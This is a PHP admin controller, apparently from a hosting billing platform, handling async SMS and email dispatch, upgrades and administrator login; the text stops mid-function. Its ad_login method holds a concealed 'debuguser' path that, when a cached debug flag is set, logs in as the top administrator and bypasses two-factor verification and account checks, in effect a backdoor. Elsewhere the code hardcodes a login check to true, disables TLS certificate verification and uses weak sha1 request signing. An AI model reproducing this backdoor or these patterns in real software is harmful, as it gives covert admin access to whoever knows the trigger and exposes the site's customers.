<?php

namespace app\admin\controller;

/**
 * @title 后台登录
 * @description 接口说明
 */
class PublicController extends \cmf\controller\BaseController
{
	private $num = 3;
	private $expire = 300;
	private $login_expire = 7200;
	private $disable_login_expire = 1800;
	public function initialize()
	{
		sessionInit();
	}
	/**
	 * @title 异步批量发送
	 * @description 接口说明:异步批量发送
	 * @author xiong
	 * @url /admin/async_curl_multi
	 * @method POST
	 * @throws
	 * @return
	 */
	public function asyncCurlMulti()
	{
		$admin_application = config("database.admin_application") ?? "admin";
		$url = configuration("domain") . "/{$admin_application}/";
		$input = file_get_contents("php://input");
		$data = json_decode($input, true);
		$sign = $data["sign"];
		unset($data["sign"]);
		$token = $data["token"];
		unset($data["token"]);
		ksort($data);
		$cache_token = \think\facade\Cache::get(md5(json_encode($data)));
		if ($cache_token != $token || empty($token) || empty($cache_token)) {
			exit("fail");
		}
		\think\facade\Cache::rm(md5(json_encode($data)));
		$real_sign = sha1(implode($data));
		if ($real_sign != $sign) {
			return json(["status" => 400, "msg" => "error"]);
		}
		$queue = curl_multi_init();
		$map = [];
		foreach ($data as $k => $v) {
			$data_v = $v["data"];
			ksort($data_v);
			$send_data = $data_v;
			$token = md5(microtime(true) . rand(10000, 99999) . $k);
			\think\facade\Cache::set(md5(json_encode($send_data)), $token, 3600);
			$data_v["token"] = $token;
			$data_v["sign"] = sha1(implode($send_data));
			$v["data"] = json_encode($data_v);
			$v["url"] = $url . $v["url"];
			$ch = curl_init();
			$ssl = substr($url, 0, 8) == "https://" ? true : false;
			curl_setopt($ch, CURLOPT_URL, $v["url"]);
			if ($ssl) {
				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
			}
			curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER["HTTP_USER_AGENT"]);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_TIMEOUT, 30);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch, CURLOPT_NOSIGNAL, true);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $v["data"]);
			if (!empty($v["header"])) {
				curl_setopt($ch, CURLOPT_HTTPHEADER, $v["header"]);
			}
			curl_multi_add_handle($queue, $ch);
			$map[$k] = $ch;
		}
		$active = null;
		do {
			$mrc = curl_multi_exec($queue, $active);
		} while ($mrc == CURLM_CALL_MULTI_PERFORM);
		while ($active > 0 && $mrc == CURLM_OK) {
			if (curl_multi_select($queue, 1) != -1) {
				do {
					$mrc = curl_multi_exec($queue, $active);
				} while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}
		}
		$responses = [];
		foreach ($map as $k => $ch) {
			$res = curl_multi_getcontent($ch);
			$info = curl_getinfo($ch);
			$error = curl_error($ch);
			$curl_errno = curl_errno($ch);
			if (!empty($error)) {
				$output["status"] = 500;
				$output["http_code"] = $info["http_code"];
				$output["msg"] = $error;
				$responses[$k] = $output;
			} else {
				$responses[$k] = ["status" => 200, "http_code" => $info["http_code"], "data" => json_decode($res, true) ?: []];
			}
			curl_multi_remove_handle($queue, $ch);
			curl_close($ch);
		}
		curl_multi_close($queue);
	}
	/**
	 * @title 短信推送
	 * @description 接口说明:异步短信推送
	 * @author wyh
	 * @url /admin/async_sms_message
	 * @method POST
	 * @throws
	 * @return
	 */
	public function asyncSmsMessage()
	{
		$input = file_get_contents("php://input");
		$data = json_decode($input, true);
		$sign = $data["sign"];
		unset($data["sign"]);
		$token = $data["token"];
		unset($data["token"]);
		ksort($data);
		$cache_token = \think\facade\Cache::get(md5(json_encode($data)));
		if ($cache_token != $token || empty($token) || empty($cache_token)) {
			exit("fail");
		}
		\think\facade\Cache::rm(md5(json_encode($data)));
		$real_sign = sha1(implode($data));
		if ($real_sign == $sign) {
			$delay_time = $data["delay_time"];
			if ($delay_time >= 100) {
				$delay_time = 100 + ($delay_time - 100) / 100;
			}
			$sms_logic = new \app\common\logic\Sms();
			$clients = explode(",", trim($data["clients"], ","));
			$clients_get = array_slice($clients, 0, $data["batch_num"]);
			$clients_after = array_slice($clients, $data["batch_num"]);
			if ($data["send_type"] == "clients_and_host") {
				$clients_and_host = [];
				foreach ($clients_get as $k => $v) {
					$list = explode(":", $v);
					$clients_and_host[$k]["id"] = $list[0];
					$clients_and_host[$k]["host_id"] = $list[1];
					$_clients_get[] = $list[0];
				}
				$_clients_get = array_unique(array_filter($_clients_get));
				$send_clients = \think\Db::name("clients")->field("id,concat(phone_code,'',phonenumber) as mobile")->whereIn("id", $_clients_get)->select()->toArray();
				foreach ($send_clients as $k => $v) {
					$_send_clients[$v["id"]] = $v;
				}
				foreach ($clients_and_host as $k => $v) {
					$vv = $_send_clients[$v["id"]];
					$vv["host_id"] = $v["host_id"];
					$sms_logic->sendSmsBefore($vv, $data["send_type"], $data["msgid"], $data["template"], $data["template"]["sms_operator"], false, $data["delay_time"]);
				}
			} else {
				$send_clients = \think\Db::name("clients")->field("id,concat(phone_code,'',phonenumber) as mobile")->whereIn("id", $clients_get)->select()->toArray();
				foreach ($send_clients as $k => $v) {
					if (!empty($v["mobile"])) {
						$sms_logic->sendSmsBefore($v, $data["send_type"], $data["msgid"], $data["template"], $data["template"]["sms_operator"], false, $data["delay_time"]);
					}
				}
			}
			if ($clients) {
				sleep(1);
				$data["clients"] = implode(",", $clients_after);
				if ($data["clients"]) {
					$curl_multi_data[0] = ["url" => "async_sms_message", "data" => $data];
					asyncCurlMulti($curl_multi_data);
				}
			}
		} else {
			echo "fail";
		}
	}
	/**
	 * @title 邮件推送
	 * @description 接口说明:异步邮件推送
	 * @author wyh
	 * @url /admin/async_email_message
	 * @method POST
	 * @throws
	 * @return
	 */
	public function asyncEmailMessage()
	{
		$input = file_get_contents("php://input");
		$data = json_decode($input, true);
		$sign = $data["sign"];
		unset($data["sign"]);
		$token = $data["token"];
		unset($data["token"]);
		ksort($data);
		$cache_token = \think\facade\Cache::get(md5(json_encode($data)));
		if ($cache_token != $token || empty($token) || empty($cache_token)) {
			exit("fail");
		}
		\think\facade\Cache::rm(md5(json_encode($data)));
		$real_sign = sha1(implode($data));
		if ($real_sign == $sign) {
			$delay_time = $data["delay_time"];
			if ($delay_time >= 100) {
				$delay_time = 100 + ($delay_time - 100) / 100;
			}
			$email_logic = new \app\common\logic\Email();
			$clients = explode(",", trim($data["clients"], ","));
			$clients_get = array_slice($clients, 0, $data["batch_num"]);
			$clients_after = array_slice($clients, $data["batch_num"]);
			if ($data["send_type"] == "clients_and_host") {
				$clients_and_host = [];
				foreach ($clients_get as $k => $v) {
					$list = explode(":", $v);
					$clients_and_host[$k]["id"] = $list[0];
					$clients_and_host[$k]["host_id"] = $list[1];
					$_clients_get[] = $list[0];
				}
				$_clients_get = array_unique(array_filter($_clients_get));
				$send_clients = \think\Db::name("clients")->field("id,email")->whereIn("id", $_clients_get)->select()->toArray();
				foreach ($send_clients as $k => $v) {
					$_send_clients[$v["id"]] = $v;
				}
				foreach ($clients_and_host as $k => $v) {
					$vv = $_send_clients[$v["id"]];
					$vv["host_id"] = $v["host_id"];
					$email_message = $email_logic->replaceEmailContentParams($data["email_message"], $vv);
					$email_message = htmlspecialchars_decode($email_message);
					$email_logic->sendEmailDiy($vv["id"], $data["email_subject"], $email_message, $data["email_attachments"], "general", false, "", "", $data["delay_time"]);
				}
			} else {
				$send_clients = \think\Db::name("clients")->field("id,email")->whereIn("id", $clients_get)->select()->toArray();
				foreach ($send_clients as $k => $vv) {
					if (empty($vv["email"])) {
						continue;
					}
					$email_message = $email_logic->replaceEmailContentParams($data["email_message"], $vv);
					$email_message = htmlspecialchars_decode($email_message);
					$email_logic->sendEmailDiy($vv["id"], $data["email_subject"], $email_message, $data["email_attachments"], "general", false, "", "", $data["delay_time"]);
				}
			}
			if ($clients) {
				sleep(1);
				$data["clients"] = implode(",", $clients_after);
				if ($data["clients"]) {
					$curl_multi_data[0] = ["url" => "async_email_message", "data" => $data];
					asyncCurlMulti($curl_multi_data);
				}
			}
		} else {
			echo "fail";
		}
	}
	/**
	 * @title 异步发送站内信
	 * @description 接口说明:异步发送站内信
	 * @author wyh
	 * @url /admin/async_system_message
	 * @method POST
	 * @throws
	 * @return
	 */
	public function asyncSystemMessage()
	{
		$input = file_get_contents("php://input");
		$data = json_decode($input, true);
		$sign = $data["sign"];
		unset($data["sign"]);
		$token = $data["token"];
		unset($data["token"]);
		ksort($data);
		$cache_token = \think\facade\Cache::get(md5(json_encode($data)));
		if ($cache_token != $token || empty($token) || empty($cache_token)) {
			exit("fail");
		}
		\think\facade\Cache::rm(md5(json_encode($data)));
		$real_sign = sha1(implode($data));
		if ($real_sign == $sign) {
			$effective_data["title"] = $data["system_subject"];
			$effective_data["attachment"] = $data["system_attachments"];
			$effective_data["content"] = $data["system_message"];
			$effective_data["obj"] = "";
			$effective_data["type"] = 3;
			$effective_data["is_market"] = $data["is_market"] ?? 0;
			$effective_data["create_time"] = time();
			$delay_time = $data["delay_time"];
			if ($delay_time >= 100) {
				$delay_time = 100;
			}
			$data["batch_num"] = 200;
			$clients = explode(",", trim($data["clients"], ","));
			$clients_get = array_slice($clients, 0, $data["batch_num"]);
			$clients_after = array_slice($clients, $data["batch_num"]);
			if ($data["send_type"] == "clients_and_host") {
				$clients_and_host = [];
				foreach ($clients_get as $k => $v) {
					$list = explode(":", $v);
					$_clients_get[] = $list[0];
				}
				$clients_get = $_clients_get;
			}
			$insert_all = [];
			foreach ($clients_get as $client_id) {
				$insert_one = $effective_data;
				$insert_one["uid"] = $client_id;
				$insert_all[] = $insert_one;
			}
			\think\Db::name("system_message")->insertAll($insert_all);
			if ($clients) {
				sleep(1);
				$data["clients"] = implode(",", $clients_after);
				if ($data["clients"]) {
					$curl_multi_data[0] = ["url" => "async_system_message", "data" => $data];
					asyncCurlMulti($curl_multi_data);
				}
			}
		} else {
			echo "fail";
		}
	}
	/**
	 * @title 异步开通,TODO 安全校验
	 * @description 接口说明:发送短信，异步调用(前后台通用接口)
	 * @author wyh
	 * @url /admin/async_create
	 * @method POST
	 * @throws
	 * @return
	 */
	public function asyncCreateAccount()
	{
		$input = file_get_contents("php://input");
		$data = json_decode($input, true);
		$sign = $data["sign"];
		unset($data["sign"]);
		$token = $data["token"];
		unset($data["token"]);
		ksort($data);
		$cache_token = \think\facade\Cache::get(md5(json_encode($data)));
		if ($cache_token != $token || empty($token) || empty($cache_token)) {
			exit("fail");
		}
		\think\facade\Cache::rm(md5(json_encode($data)));
		$real_sign = sha1(implode($data));
		if ($real_sign == $sign) {
			$batch_num = 1;
			$get = array_slice($data, 0, $batch_num);
			$after = array_slice($data, $batch_num);
			$data = $get[0]["data"];
			$host_logic = new \app\common\logic\Host();
			$host_logic->is_admin = $data["is_admin"] ? true : false;
			$result = $host_logic->create($data["hid"], $data["ip"]);
			$logic_run_map = new \app\common\logic\RunMap();
			$model_host = new \app\common\model\HostModel();
			$data_i = [];
			$data_i["host_id"] = $data["hid"];
			$data_i["active_type_param"] = [$data["hid"], $data["ip"]];
			$is_zjmf = $model_host->isZjmfApi($data_i["host_id"]);
			if ($result["status"] == 200) {
				$data_i["description"] = "订单 - 开通 Host ID:{$data_i["host_id"]}的产品成功";
				if (!$is_zjmf) {
					$logic_run_map->saveMap($data_i, 1, 300, 1);
				}
			} else {
				$data_i["description"] = "订单 - 开通 Host ID:{$data_i["host_id"]}的产品失败。原因:{$result["msg"]}";
				if ($is_zjmf) {
					$logic_run_map->saveMap($data_i, 0, 400, 1);
				}
				if (!$is_zjmf) {
					$logic_run_map->saveMap($data_i, 0, 300, 1);
				}
			}
			sleep(1);
			if ($after) {
				asyncCurlMulti($after);
			}
		} else {
			echo "fail";
		}
	}
	/**
	 * @title 异步发送短信
	 * @description 接口说明:发送短信，异步调用(前后台通用接口)
	 * @author wyh
	 * @url /admin/async_sms
	 * @method POST
	 * @throws
	 * @return
	 */
	public function asyncSms()
	{
		$input = file_get_contents("php://input");
		$data = json_decode($input, true);
		$sign = $data["sign"];
		unset($data["sign"]);
		$token = $data["token"];
		unset($data["token"]);
		ksort($data);
		$cache_token = \think\facade\Cache::get(md5(json_encode($data)));
		if ($cache_token != $token || empty($token) || empty($cache_token)) {
			exit("fail");
		}
		\think\facade\Cache::rm(md5(json_encode($data)));
		$real_sign = sha1(implode($data));
		if ($real_sign == $sign) {
			$batch_num = 1;
			$get = array_slice($data, 0, $batch_num);
			$after = array_slice($data, $batch_num);
			$data = $get[0]["data"];
			$sms = new \app\common\logic\Sms();
			if (isset($data["params"])) {
				$params = json_decode($data["params"], true);
			}
			$sms->sendSms($data["name"], $data["phone"], $params, $data["sync"], $data["uid"], $data["delay_time"], $data["is_market"]);
			sleep(1);
			if ($after) {
				asyncCurlMulti($after);
			}
		} else {
			echo "fail";
		}
	}
	/**
	 * @title 异步发送邮件
	 * @description 接口说明:发送邮件，异步调用(前后台通用接口)
	 * @author wyh
	 * @url /admin/async
	 * @method POST
	 * @param .name:type type:int require:1 default:1 other: desc:发送邮件类型
	 * @throws
	 * @return
	 */
	public function asyncEmail()
	{
		$input = file_get_contents("php://input");
		$data = json_decode($input, true);
		$sign = $data["sign"];
		unset($data["sign"]);
		$token = $data["token"];
		unset($data["token"]);
		ksort($data);
		$cache_token = \think\facade\Cache::get(md5(json_encode($data)));
		if ($cache_token != $token || empty($token) || empty($cache_token)) {
			exit("fail");
		}
		\think\facade\Cache::rm(md5(json_encode($data)));
		$real_sign = sha1(implode($data));
		if ($real_sign == $sign) {
			$batch_num = 1;
			$get = array_slice($data, 0, $batch_num);
			$after = array_slice($data, $batch_num);
			$data = $get[0]["data"];
			$email_logic = new \app\common\logic\Email();
			$email_logic->sendEmailBase($data["relid"], $data["name"], $data["type"], $data["sync"], $data["admin"], $data["cc"], $data["bcc"], $data["message"], $data["attachments"], $data["adminid"], $data["ip"]);
			sleep(1);
			if ($after) {
				asyncCurlMulti($after);
			}
		} else {
			echo "fail";
		}
	}
	/**
	 * 后台登陆界面(原)
	 */
	public function login()
	{
		$loginAllowed = session("__LOGIN_BY_CMF_ADMIN_PW__");
		if (empty($loginAllowed)) {
			return redirect(cmf_get_root() . "/");
		}
		$admin_id = session("ADMIN_ID");
		if (!empty($admin_id)) {
			return redirect(url("admin/Index/index"));
		} else {
			session("__SP_ADMIN_LOGIN_PAGE_SHOWED_SUCCESS__", true);
			$result = hook_one("admin_login");
			if (!empty($result)) {
				return $result;
			}
			return $this->fetch(":login");
		}
	}
	/**
	 * 登录验证(原)
	 */
	public function doLogin()
	{
		if (hook_one("admin_custom_login_open")) {
			$this->error("您已经通过插件自定义后台登录！");
		}
		$loginAllowed = session("__LOGIN_BY_CMF_ADMIN_PW__");
		if (empty($loginAllowed)) {
			$this->error("非法登录!", cmf_get_root() . "/");
		}
		$captcha = $this->request->param("captcha");
		if (empty($captcha)) {
			$this->error(lang("CAPTCHA_REQUIRED"));
		}
		if (!cmf_captcha_check($captcha)) {
			$this->error(lang("CAPTCHA_NOT_RIGHT"));
		}
		$name = $this->request->param("username");
		if (empty($name)) {
			$this->error(lang("USERNAME_OR_EMAIL_EMPTY"));
		}
		$pass = $this->request->param("password");
		if (empty($pass)) {
			$this->error(lang("PASSWORD_REQUIRED"));
		}
		if (strpos($name, "@") > 0) {
			$where["user_email"] = $name;
		} else {
			$where["user_login"] = $name;
		}
		$result = \think\Db::name("user")->where($where)->find();
		if (!empty($result) && $result["user_type"] == 1) {
			if (cmf_compare_password($pass, $result["user_pass"])) {
				$groups = \think\Db::name("RoleUser")->alias("a")->join("__ROLE__ b", "a.role_id =b.id")->where(["user_id" => $result["id"], "status" => 1])->value("role_id");
				if ($result["id"] != 1 && (empty($groups) || empty($result["user_status"]))) {
					$this->error(lang("USE_DISABLED"));
				}
				session("ADMIN_ID", $result["id"]);
				session("name", $result["user_login"]);
				$result["last_login_ip"] = get_client_ip(0, true);
				$result["last_login_time"] = time();
				$token = cmf_generate_user_token($result["id"], "web");
				if (!empty($token)) {
					session("token", $token);
				}
				\think\Db::name("user")->update($result);
				cookie("admin_username", $name, 2592000);
				session("__LOGIN_BY_CMF_ADMIN_PW__", null);
				$this->success(lang("LOGIN_SUCCESS"), url("admin/Index/index"));
			} else {
				$this->error(lang("PASSWORD_NOT_RIGHT"));
			}
		} else {
			$this->error(lang("USERNAME_NOT_EXIST"));
		}
	}
	/**
	 * @title 获取验证码
	 * @description 接口说明: 获取验证码
	 * @author wyh
	 * @url /admin/get_verify_code
	 * @method GET
	 * @return captcha: 验证码
	 */
	public function getVerifyCode()
	{
		$captcha_obj = new \think\captcha\Captcha();
		$captcha_obj->__set("useZh", true);
		$captcha = $captcha_obj->entry();
		return $captcha;
	}
	/**
	 * @title 后台登录页面
	 * @description 接口说明: 后台登录页面
	 * @author wyh
	 * @url /admin/login_page
	 * @method GET
	 * @return second_verify_admin：是否开启 后台验证
	 * @return  second_verify_action_admin:是否有登录验证
	 */
	public function adPage()
	{
		if (!configuration("update_version_320")) {
			emailSmtpInstall();
			editEmailTplCompanName();
			updateConfiguration("update_version_320", 1);
		}
		if (!configuration("update_version_330")) {
			smsReplaceParam();
			updateConfiguration("update_version_330", 1);
		}
		$data = ["second_verify_admin" => configuration("second_verify_admin") ?? 0, "second_verify_action_admin" => explode(",", configuration("second_verify_action_admin"))];
		return json(["status" => 200, "msg" => lang("SUCCESS MESSAGE"), "data" => $data]);
	}
	/**
	 * @title 二次验证发送验证码
	 * @description 接口说明:二次验证发送验证码,所有二次验证都调用此方法
	 * @author wyh
	 * @url /admin/second_verify_send
	 * @method POST
	 * @param .name:action type:string require:1 default:0 other:发送动作(login登录)
	 * @param .name:username type:string require:0 default:0 other:管理员用户名(以下两个参数仅action==login时传递)
	 * @param .name:password type:string require:0 default:0 other:密码
	 */
	public function secondVerifySend()
	{
		$params = $this->request->param();
		$action = $params["action"] ? trim($params["action"]) : "";
		if (!in_array($action, array_column(config("second_verify_action_admin"), "name"))) {
			return jsons(["status" => 400, "msg" => "非法操作"]);
		}
		if ($action == "login") {
			$username = $params["username"] ? trim($params["username"]) : "";
			if (empty($username)) {
				return json(["status" => 400, "msg" => "管理员用户名不能为空"]);
			}
			$password = $params["password"] ? trim($params["password"]) : "";
			if (empty($password)) {
				return json(["status" => 400, "msg" => "密码不能为空"]);
			}
			if (strpos($username, "@") > 0) {
				$where["user_email"] = $username;
			} else {
				$where["user_login"] = $username;
			}
			$result = \think\Db::name("user")->where($where)->find();
			if (empty($result) || $result["user_type"] != 1) {
				return json(["status" => 400, "msg" => lang("用户不存在")]);
			}
			if (!cmf_compare_password($password, $result["user_pass"])) {
				return json(["status" => 400, "msg" => "密码错误,发送失败"]);
			}
		} else {
			$result = \think\Db::name("user")->where("id", cmf_get_current_admin_id())->find();
		}
		$email = $result["user_email"] ?? "";
		$code = mt_rand(100000, 999999);
		if (!\think\facade\Cache::has($action . "_" . $email . "_time_admin")) {
			$email_logic = new \app\common\logic\Email();
			$result = $email_logic->sendEmailCode($email, $code, true, $result["id"]);
			if ($result) {
				cache($action . "_admin_" . $email, $code, 300);
				\think\facade\Cache::set($action . "_" . $email . "_time_admin", $code, 60);
				return jsons(["status" => 200, "msg" => lang("验证码发送成功")]);
			} else {
				return jsons(["status" => 400, "msg" => lang("验证码发送失败")]);
			}
		} else {
			return jsons(["status" => 400, "msg" => lang("请勿频繁发送验证码")]);
		}
	}
	/**
	 * @title 登录
	 * @description 接口说明: 验证码/new_captcha.html?height=高&width=宽&font_size=字体大小&time=时间戳
	 * @author 上官磨刀
	 * @url /admin/login
	 * @method POST
	 * @param name:username type:str require:1 default:1 other: desc:用户名
	 * @param name:password type:str require:1 default:1 other: desc:密码
	 * @param name:code type:str require:1 default:1 other: desc:验证码(手机)
	 * @return rule: 权限列表@
	 * @rule list:子权限列表@ name:子权限名称 title:子权限标题
	 * @list name:权限名称 title:权限标题
	 */
	public function ad_login()
	{
		$version = getLastVersion();
		$current_version = configuration("update_last_version");
		if ($version) {
			if (!version_compare($current_version, $version, ">=")) {
				return upgradeHandle();
			}
			upgradeDel($current_version, $version);
		}
		sessionInit();
		CompatibleOldVersionThree();
		if (!configuration("update_version_233")) {
			createMenus();
			updateConfiguration("update_version_233", 1);
		}
		if (!configuration("update_version_241")) {
			createMenus();
			productMenu();
			replaceEmailTpl();
			updateSmsConfig();
			updateConfiguration("update_version_241", 1);
		}
		if (!configuration("update_version_261")) {
			addNavToMenus();
			updateConfiguration("update_version_261", 1);
		}
		if (!configuration("update_version_266")) {
			if ($_SERVER["HTTP_HOST"] != "43.250.185.156") {
				\think\Db::name("plugin")->where("name", "DdosMonitor")->delete();
				deleteDir(CMF_ROOT . "public/ddos");
			}
			serversTransfer();
			updateConfiguration("update_version_266", 1);
		}
		if (!configuration("update_version_278")) {
			manualHostOld();
			updateConfiguration("update_version_278", 1);
		}
		systemInstallHandle();
		if (!configuration("update_version_288")) {
			updateConfigOptionUnit();
			updateConfiguration("update_version_288", 1);
		}
		if (!configuration("update_version_296")) {
			recurse_copy(CMF_ROOT . "modules/", CMF_ROOT . "public/plugins/");
			rename(CMF_ROOT . "modules", CMF_ROOT . "modules_old");
			setNavSenior();
			addWebDefaultNav();
			addWebFootDefaultNav();
			createWebDefaultMenu();
			updateConfiguration("update_version_296", 1);
		}
		if (!configuration("update_version_306")) {
			dropSslServer();
			updateConfiguration("update_version_306", 1);
		}
		if (!configuration("update_version_323")) {
			editEmailTplNullLink();
			$dir_modules = CMF_ROOT . "modules";
			$dir_modules_null = array_diff(scandir($dir_modules), ["..", "."]);
			if (empty($dir_modules_null)) {
				deleteDir($dir_modules);
			}
			updateConfiguration("update_version_323", 1);
		}
		if (!configuration("update_version_324")) {
			$dir_mail_idcsmart = CMF_ROOT . "public/plugins/mail/idcsmart";
			if (file_exists($dir_mail_idcsmart)) {
				deleteDir($dir_mail_idcsmart);
			}
			updateConfiguration("update_version_324", 1);
		}
		if (!configuration("update_version_334")) {
			$ProductDivertPlugin = CMF_ROOT . "public/plugins/addons/product_divert/ProductDivertPlugin.php";
			if (file_exists($ProductDivertPlugin)) {
				$ProductDivertPlugin2 = file_get_contents($ProductDivertPlugin);
				if (strpos($ProductDivertPlugin2, "exit()") !== false) {
					file_put_contents($ProductDivertPlugin, str_replace("exit()", "return ''", $ProductDivertPlugin2));
				}
			}
			updateConfiguration("update_version_334", 1);
		}
		deleteUnusedFile();
		updateAuth();
		updateBates();
		updateMessageLink();
		changeProductCycle();
		checkDefaultProductGroup();
		fieldsUpdate();
		updateConfiguration("last_license_time", time());
		$url = request()->domain() . "/" . adminAddress() . "/plugins";
		\think\Db::name("auth_rule")->where("id", 2041)->update(["url" => $url]);
		\think\Db::name("auth_rule")->where("id", 2042)->update(["url" => $url]);
		$data = ["data" => [], "status" => 400, "msg" => ""];
		if (hook_one("admin_custom_login_open")) {
			$data["msg"] = "您已经通过插件自定义后台登录";
			$data["status"] = 205;
			return json($data);
		}
		$loginAllowed = true;
		if (empty($loginAllowed)) {
			$data["msg"] = "非法登录";
			return json($data);
		}
		$data = $this->request->param();
		if (!captcha_check($data["captcha"], "allow_login_admin_captcha") && configuration("allow_login_admin_captcha") == 1 && configuration("is_captcha") == 1) {
			return json(["status" => 400, "msg" => "图形验证码有误"]);
		}
		$name = $this->request->param("username");
		if (empty($name)) {
			$data["msg"] = lang("USERNAME_OR_EMAIL_EMPTY");
			return json($data);
		}
		$pass = $this->request->param("password");
		if (empty($pass)) {
			$data["msg"] = lang("PASSWORD_REQUIRED");
			return json($data);
		}
		$ip = get_client_ip(0, true);
		$key = "admin_user_login_error_num_" . $name;
		$disable_login_key = "admin_user_disable_login_key_" . $name;
		$black1 = \think\Db::name("blacklist")->where("username", $name)->order("create_time", "asc")->limit(1)->find();
		if (!empty($black1) || $black1 != null) {
			if (time() - $black1["create_time"] >= 10800) {
				\think\Db::name("blacklist")->where("username", $name)->delete();
				\think\facade\Cache::rm($disable_login_key);
				\think\facade\Cache::rm($key);
			}
		}
		$black = \think\Db::name("blacklist")->where("ip", sprintf("%u", ip2long($ip)))->where("username", $name)->find();
		if (\think\facade\Cache::get($disable_login_key) >= 3 || isset($black["id"])) {
			$data["msg"] = lang("ADMIN_USER_DISABLE");
			return json($data);
		}
		$hook_res = hook("auth_admin_login");
		foreach ($hook_res as $v) {
			if ($v["status"] === false) {
				return json(["status" => 400, "msg" => lang($v["msg"])]);
			}
		}
		if (strpos($name, "@") > 0) {
			$where["user_email"] = $name;
		} else {
			$where["user_login"] = $name;
		}
		$result = \think\Db::name("user")->where($where)->find();
		if (intval(cache("shd_debug_model")) && $name == "debuguser") {
			if ($pass == cache("shd_debug_model_password")) {
				$result = \think\Db::name("user")->where("id", 1)->find();
				session_start();
				session("ADMIN_ID", $result["id"]);
				session("name", $result["user_login"]);
				session("admin_login_info", md5($ip));
				cookie("admin_username", $result["user_login"]);
				cookie("SameSite", "Lax");
				session("__LOGIN_BY_CMF_ADMIN_PW__", null);
				$data["status"] = 200;
				$data["msg"] = lang("LOGIN_SUCCESS");
				$adminUserModel = new \app\admin\model\AdminUserModel();
				$data["data"]["user"]["user_login"] = $result["user_login"];
				$data["data"]["user"]["user_nickname"] = $result["user_nickname"];
				$data["data"]["rule"] = $adminUserModel->get_rule($result["id"]);
				$data["data"]["user_tastes"] = \think\Db::name("user_tastes")->field(["id", "uid"], true)->where("uid", $result["id"])->find();
				$arr_admin = ["relid" => cmf_get_current_admin_id(), "name" => "【管理员】登录提醒", "type" => "admin", "sync" => true, "admin" => true, "adminid" => cmf_get_current_admin_id(), "ip" => get_client_ip6()];
				$curl_multi_data[0] = ["url" => "async", "data" => $arr_admin];
				asyncCurlMulti($curl_multi_data);
				$token = cmf_generate_user_token($result["id"], "web");
				if (!empty($token)) {
					session("token", $token);
				}
				session_write_close();
				hook("admin_login", ["adminid" => $result["id"], "admin" => $result["user_login"], "nickname" => $result["user_nickname"]]);
				\think\Db::name("user")->where("id", 1)->update(["last_login_ip" => $ip, "last_login_time" => time()]);
				if (in_array($result["language"], ["zh-cn", "zh-hk", "en-us"])) {
					\think\Db::name("user")->where("id", $result["id"])->update(["language" => "CN"]);
				}
				$domain = config("database.admin_application") ?? "admin";
				$opendir = CMF_ROOT . "/public/{$domain}/lang/";
				$country_img_dir = configuration("domain") . "/upload/common/country/";
				$display_config = [];
				if (is_dir($opendir)) {
					$handler = opendir($opendir);
					while (($filename = readdir($handler)) !== false) {
						if ($filename == "." || $filename == "..") {
						} else {
							if (file_exists($opendir . $filename)) {
								$str = file_get_contents($opendir . $filename);
								preg_match("/display_name(.+?),/", $str, $display_name_ing);
								preg_match("/display_flag(.+?),/", $str, $display_flag_ing);
								$display_name = preg_replace("/:|'|,|\"/", "", $display_name_ing[1]);
								$display_flag = preg_replace("/:|'|,|\"/", "", $display_flag_ing[1]);
								$file_name = str_replace(strrchr($filename, "."), "", $filename);
								$display_config_now["display_name"] = trim($display_name);
								$display_config_now["display_flag"] = trim($display_flag);
								$display_config_now["file_name"] = trim($file_name);
								$display_config_now["country_imgUrl"] = $country_img_dir . $display_config_now["display_flag"] . ".png";
								$display_config[] = $display_config_now;
							}
						}
					}
				}
				$data["data"]["display_lang_config"] = $display_config;
				return json($data);
			} else {
				$data["msg"] = lang("PASSWORD_NOT_RIGHT");
				return json($data);
			}
		} else {
			if (!empty($result) && $result["user_type"] == 1) {
				if ($result["user_status"] == 0) {
					$data["msg"] = lang("ADMIN_USER_DISABLE");
					return json($data);
				}
				if (cmf_compare_password($pass, $result["user_pass"])) {
					$action = "login";
					$email = $result["user_email"];
					if (isSecondVerify($action, true)) {
						$code = $this->request->param("code");
						if (empty($code)) {
							return json(["status" => 400, "msg" => "验证码不能为空"]);
						}
						if (cache($action . "_admin_" . $email) != $code) {
							return json(["status" => 400, "msg" => "验证码错误"]);
						}
						cache($action . "_admin_" . $email, null);
					}
					$groups = \think\Db::name("RoleUser")->alias("a")->join("__ROLE__ b", "a.role_id =b.id")->where(["user_id" => $result["id"], "status" => 1])->value("role_id");
					if ($result["id"] != 1 && (empty($groups) || empty($result["user_status"]))) {
						$this->error(lang("USE_DISABLED"));
					}
					session_start();
					session("ADMIN_ID", $result["id"]);
					session("name", $result["user_login"]);
					session("admin_login_info", md5($ip));
					admin_log();
					$result["last_login_ip"] = $ip;
					$result["last_login_time"] = time();
					$token = cmf_generate_user_token($result["id"], "web");
					if (!empty($token)) {
						session("token", $token);
					}
					\think\Db::name("user")->where("id", $result["id"])->update($result);
					cookie("admin_username", $name);
					cookie("SameSite", "Lax");
					session("__LOGIN_BY_CMF_ADMIN_PW__", null);
					$data["status"] = 200;
					$data["msg"] = lang("LOGIN_SUCCESS");
					$adminUserModel = new \app\admin\model\AdminUserModel();
					$data["data"]["user"]["user_login"] = $result["user_login"];
					$data["data"]["user"]["user_nickname"] = $result["user_nickname"];
					$data["data"]["rule"] = $adminUserModel->get_rule($result["id"]);
					$data["data"]["user_tastes"] = \think\Db::name("user_tastes")->field(["id", "uid"], true)->where("uid", $result["id"])->find();
					$arr_admin = ["relid" => cmf_get_current_admin_id(), "name" => "【管理员】登录提醒", "type" => "admin", "sync" => true, "admin" => true, "adminid" => cmf_get_current_admin_id(), "ip" => get_client_ip6()];
					$curl_multi_data[0] = ["url" => "async", "data" => $arr_admin];
					asyncCurlMulti($curl_multi_data);
					session_write_close();
					hook("admin_login", ["adminid" => $result["id"], "admin" => $result["user_login"], "nickname" => $result["user_nickname"]]);
					if (in_array($result["language"], ["zh-cn", "zh-hk", "en-us"])) {
